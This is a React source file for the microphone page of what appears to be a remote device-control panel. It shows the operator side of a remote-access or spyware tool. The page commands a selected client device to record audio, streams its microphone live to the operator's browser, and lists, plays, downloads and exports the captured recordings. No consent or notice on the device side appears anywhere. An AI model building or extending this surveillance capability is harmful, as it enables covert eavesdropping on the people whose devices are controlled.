import { useState, useRef, useEffect } from 'react';
import { useOutletContext } from 'react-router-dom';
import { clientsApi } from '@/services/api';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, ClientFile } from '@/types';
import { CMD } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, SectionCard, StatusBadge, LoadingSkeleton } from '@/components/device/shared';
import { DataActionsMenu, buildFileActions } from '@/components/device/DataActionsMenu';
import { Mic as MicIcon, CircleStop, Radio } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { onDataUpdate, onMicStream } from '@/services/socket';
import { AuthAudio, downloadAuthFile } from '@/components/AuthMedia';
import { Download } from 'lucide-react';

export default function MicPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [recording, setRecording] = useState(false);
  const [micStatus, setMicStatus] = useState<string | null>(null);
  const [duration, setDuration] = useState('30');
  const [localError, setLocalError] = useState<string | null>(null);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [streaming, setStreaming] = useState(false);
  const [liveChunks, setLiveChunks] = useState(0);
  const [liveBytes, setLiveBytes] = useState(0);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const pcmQueueRef = useRef<Float32Array[]>([]);
  const pcmPlayingRef = useRef(false);
  const chunkCountRef = useRef(0);
  const byteCountRef = useRef(0);
  const statsTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const { data: rawData, loading, error, refresh, sendCommand, commandStatus, clearData } = useDeviceData<{
    recordings: ClientFile[];
    status: { status?: string; duration?: number } | null;
  }>({
    clientId,
    page: 'mic',
    extractData: (d) => ({
      recordings: Array.isArray(d.list) ? d.list : [],
      status: (d.status as { status?: string; duration?: number }) || null,
    }),
    dataType: 'mic',
    defaultValue: { recordings: [], status: null },
  });

  const recordings = rawData.recordings;

  const [exporting, setExporting] = useState(false);

  const fileActions = buildFileActions({
    files: recordings.map((r) => ({ url: `/api/files/recordings/${clientId}/${r.id}`, name: r.originalName })),
    metadata: recordings,
    exportPrefix: 'mic-recordings',
    onClear: clearData,
    onExportStart: () => setExporting(true),
    onExportEnd: () => setExporting(false),
  });

  useEffect(() => {

    if (rawData.status?.status) {
      setMicStatus(rawData.status.status);
      if (rawData.status.status === 'recording') {
        setRecording(true);

        const sec = typeof rawData.status.duration === 'number' && rawData.status.duration > 0
          ? rawData.status.duration : 60;
        if (timerRef.current) clearTimeout(timerRef.current);
        timerRef.current = setTimeout(() => {
          refresh();
          setRecording(false);
        }, (sec + 3) * 1000);
      } else if (rawData.status.status === 'stopped' || rawData.status.status === 'error') {
        setRecording(false);
        if (timerRef.current) { clearTimeout(timerRef.current); timerRef.current = null; }
      }
    }
  }, [rawData.status, refresh]);

  useEffect(() => {
    const unsub = onDataUpdate((cid, dataType, payload) => {
      if (cid !== clientId) return;
      if (dataType === 'mic_status' && payload) {
        if (payload.streamStatus === 'streaming') {
          setStreaming(true);
        } else if (payload.streamStatus === 'stopped') {
          setStreaming(false);
          pcmQueueRef.current = [];
          if (audioCtxRef.current) { try { audioCtxRef.current.close(); } catch {} audioCtxRef.current = null; }
        } else {
          const status = typeof payload.status === 'string' ? payload.status : null;
          setMicStatus(status);
          if (status === 'recording') {
            setRecording(true);
          } else if (status === 'stopped' || status === 'error') {
            setRecording(false);
            setStreaming(false);
            pcmQueueRef.current = [];
            if (audioCtxRef.current) { try { audioCtxRef.current.close(); } catch {} audioCtxRef.current = null; }
            pcmPlayingRef.current = false;
            if (timerRef.current) {
              clearTimeout(timerRef.current);
              timerRef.current = null;
            }
            refresh();
          }
        }
      }
    });
    return unsub;
  }, [clientId, refresh]);

  useEffect(() => {
    return () => {
      if (timerRef.current) {
        clearTimeout(timerRef.current);
        timerRef.current = null;
      }
      if (recording && clientId) {
        clientsApi.sendCommand(clientId, CMD.MIC, { action: 'stop' }).catch(() => {});
      }
    };
  }, [recording, clientId]);

  useEffect(() => {
    const unsub = onMicStream((meta, binary) => {
      if (meta.id !== clientId || !streaming) return;
      chunkCountRef.current++;
      byteCountRef.current += binary.byteLength;
      try {
        const pcm16 = new Int16Array(binary);
        const float32 = new Float32Array(pcm16.length);
        for (let i = 0; i < pcm16.length; i++) {
          float32[i] = pcm16[i] / 32768;
        }
        pcmQueueRef.current.push(float32);
        if (!pcmPlayingRef.current) playPcmQueue();
      } catch {}
    });
    return unsub;
  }, [clientId, streaming]);

  useEffect(() => {
    if (!streaming) {
      setLiveChunks(0);
      setLiveBytes(0);
      chunkCountRef.current = 0;
      byteCountRef.current = 0;
      if (statsTimerRef.current) { clearInterval(statsTimerRef.current); statsTimerRef.current = null; }
      return;
    }
    chunkCountRef.current = 0;
    byteCountRef.current = 0;
    statsTimerRef.current = setInterval(() => {
      setLiveChunks(chunkCountRef.current);
      setLiveBytes(byteCountRef.current);
      chunkCountRef.current = 0;
      byteCountRef.current = 0;
    }, 1000);
    return () => {
      if (statsTimerRef.current) { clearInterval(statsTimerRef.current); statsTimerRef.current = null; }
    };
  }, [streaming]);

  useEffect(() => {
    return () => { if (statsTimerRef.current) clearInterval(statsTimerRef.current); };
  }, []);

  useEffect(() => {
    if (!online && streaming) {
      setStreaming(false);
      pcmQueueRef.current = [];
      pcmPlayingRef.current = false;
      if (audioCtxRef.current) { try { audioCtxRef.current.close(); } catch {} audioCtxRef.current = null; }
    }
  }, [online, streaming]);

  const streamingRef = useRef(false);
  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  useEffect(() => {
    return () => {
      if (streamingRef.current && clientId) {
        clientsApi.sendCommand(clientId, CMD.MIC, { action: 'stream_stop' }).catch(() => {});
      }
      pcmPlayingRef.current = false;
      if (audioCtxRef.current) {
        try { audioCtxRef.current.close(); } catch {}
        audioCtxRef.current = null;
      }
      setStreaming(false);
    };
  }, [clientId]);

  const nextPlayTimeRef = useRef(0);

  const playPcmQueue = () => {
    if (pcmQueueRef.current.length === 0) {
      pcmPlayingRef.current = false;
      nextPlayTimeRef.current = 0;
      return;
    }
    if (pcmQueueRef.current.length > 20) {
      pcmQueueRef.current.splice(0, pcmQueueRef.current.length - 20);
    }
    if (!audioCtxRef.current) {
      try {
        audioCtxRef.current = new AudioContext({ sampleRate: 8000 });
      } catch {
        try {
          audioCtxRef.current = new AudioContext();
        } catch {
          pcmPlayingRef.current = false;
          pcmQueueRef.current = [];
          setLocalError('Audio playback not supported in this browser');
          return;
        }
      }
    }
    const ctx = audioCtxRef.current;
    if (!ctx) { pcmPlayingRef.current = false; return; }
    pcmPlayingRef.current = true;
    if (ctx.state === 'suspended') { ctx.resume().catch(() => {}); }
    const chunk = pcmQueueRef.current.shift()!;
    const buf = ctx.createBuffer(1, chunk.length, 8000);
    buf.getChannelData(0).set(chunk);
    const src = ctx.createBufferSource();
    src.buffer = buf;
    src.connect(ctx.destination);
    const now = ctx.currentTime;
    const startAt = Math.max(now, nextPlayTimeRef.current);
    src.start(startAt);
    nextPlayTimeRef.current = startAt + buf.duration;
    src.onended = () => playPcmQueue();
  };

  const startStream = async () => {
    setStreaming(true);
    setLocalError(null);
    pcmQueueRef.current = [];
    try {
      const res = await clientsApi.sendCommand(clientId, CMD.MIC, { action: 'stream_start' });
      if (!res.data?.sent) {
        setStreaming(false);
        setLocalError('Device offline. Stream queued.');
      }
    } catch {
      setStreaming(false);
      setLocalError('Failed to start mic stream');
    }
  };

  const stopStream = async () => {
    try { await clientsApi.sendCommand(clientId, CMD.MIC, { action: 'stream_stop' }); } catch {}
    setStreaming(false);
    pcmQueueRef.current = [];
    pcmPlayingRef.current = false;
    if (audioCtxRef.current) {
      try { audioCtxRef.current.close(); } catch {}
      audioCtxRef.current = null;
    }
  };

  const startRecording = async () => {
    const sec = parseInt(duration, 10);
    if (isNaN(sec) || sec < 1) return;
    setLocalError(null);
    try {
      await sendCommand(CMD.MIC, { sec });
      setRecording(true);
      timerRef.current = setTimeout(() => {
        refresh();
        setRecording(false);
      }, (sec + 3) * 1000);
    } catch (err: any) {
      setLocalError(err?.message || err?.response?.data?.error || 'Failed to start recording.');
    }
  };

  const stopRecording = async () => {
    try {
      await sendCommand(CMD.MIC, { action: 'stop' });

      if (timerRef.current) {
        clearTimeout(timerRef.current);
        timerRef.current = null;
      }
      setRecording(false);
    } catch {
      setLocalError('Failed to stop recording. Device may still be recording.');

    }
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Microphone"
        subtitle={`${recordings.length} recordings`}
        moreActions={<DataActionsMenu actions={fileActions} disabled={loading} loadingLabel={exporting ? 'Export ZIP' : null} />}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {(error || localError) && <ErrorAlert message={localError || error!} onRetry={refresh} />}

      <SectionCard>
        <div className="flex flex-col sm:flex-row sm:items-center gap-2">
          <div className="flex items-center gap-2">
            <Input
              type="number"
              placeholder="Duration (sec)"
              value={duration}
              onChange={(e) => setDuration(e.target.value)}
              className="w-28 h-8 text-xs"
              min="1"
              max="3600"
              disabled={recording || streaming}
            />
            <span className="text-xs text-muted-foreground">seconds</span>
          </div>
          {!recording ? (
            <Button onClick={startRecording} disabled={!online || streaming} size="sm" className="h-8">
              <MicIcon className="h-3.5 w-3.5 mr-1.5" />
              Record
            </Button>
          ) : (
            <Button onClick={stopRecording} variant="destructive" size="sm" className="h-8">
              <CircleStop className="h-3.5 w-3.5 mr-1.5" />
              Stop
            </Button>
          )}
          {!streaming ? (
            <Button onClick={startStream} disabled={!online || recording} variant="outline" size="sm" className="h-8">
              <Radio className="h-3.5 w-3.5 mr-1.5" />
              Live
            </Button>
          ) : (
            <Button onClick={stopStream} variant="destructive" size="sm" className="h-8">
              <CircleStop className="h-3.5 w-3.5 mr-1.5" />
              Stop Live
            </Button>
          )}
        </div>
        {recording && (
          <div className="mt-2">
            <StatusBadge label="Recording in progress" status="danger" />
          </div>
        )}
        {streaming && (
          <div className="mt-2 flex items-center gap-3 flex-wrap">
            <StatusBadge label="Live streaming" status="danger" />
            <div className="flex items-center gap-1.5">
              <span className="text-xs text-muted-foreground">Chunks:</span>
              <span className={`text-xs font-mono px-2 py-0.5 rounded border ${liveChunks > 0 ? 'bg-green-500/15 text-green-500 border-green-500/20' : 'bg-muted text-muted-foreground border-transparent'}`}>{liveChunks}/s</span>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="text-xs text-muted-foreground">Rate:</span>
              <span className={`text-xs font-mono px-2 py-0.5 rounded border ${liveBytes > 0 ? 'bg-green-500/15 text-green-500 border-green-500/20' : 'bg-muted text-muted-foreground border-transparent'}`}>{liveBytes >= 1024 ? `${(liveBytes / 1024).toFixed(1)} KB/s` : `${liveBytes} B/s`}</span>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="text-xs text-muted-foreground">Queue:</span>
              <span className="text-xs font-mono px-2 py-0.5 rounded bg-muted text-muted-foreground">{pcmQueueRef.current.length}</span>
            </div>
          </div>
        )}
        {micStatus && !recording && !streaming && (
          <div className="mt-2">
            <StatusBadge
              label={micStatus === 'recording' ? 'Recording' : micStatus === 'stopped' ? 'Stopped' : micStatus === 'error' ? 'Error' : micStatus}
              status={micStatus === 'recording' ? 'danger' : micStatus === 'stopped' ? 'success' : micStatus === 'error' ? 'danger' : 'neutral'}
            />
          </div>
        )}
      </SectionCard>

      {loading && !error ? (
        <LoadingSkeleton rows={3} />
      ) : (
        <SectionCard title={`Recordings (${recordings.length})`} icon={MicIcon}>
          {recordings.length === 0 ? (
            <EmptyState
              icon={MicIcon}
              title="No recordings"
              description="Set a duration and click Record to start"
            />
          ) : (
            <div className="space-y-2">
              {recordings.map((rec) => (
                <div key={`rec-${rec.id}`} className="flex items-center gap-3 p-2.5 bg-muted/40 rounded-lg">
                  <div className="h-8 w-8 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
                    <MicIcon className="h-4 w-4 text-primary" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-xs font-medium truncate">{rec.originalName}</p>
                    <p className="text-[10px] text-muted-foreground">{rec.createdAt ? new Date(rec.createdAt).toLocaleString() : '-'}</p>
                  </div>
                  <AuthAudio src={`/api/files/recordings/${clientId}/${rec.id}`} />
                  <Button
                    variant="ghost"
                    size="sm"
                    className="h-7 px-2"
                    onClick={async () => { const ok = await downloadAuthFile(`/api/files/recordings/${clientId}/${rec.id}`, rec.originalName); if (!ok) setLocalError('Failed to download recording.'); }}
                    title="Download recording"
                  >
                    <Download className="h-3.5 w-3.5" />
                  </Button>
                </div>
              ))}
            </div>
          )}
        </SectionCard>
      )}
    </div>
  );
}
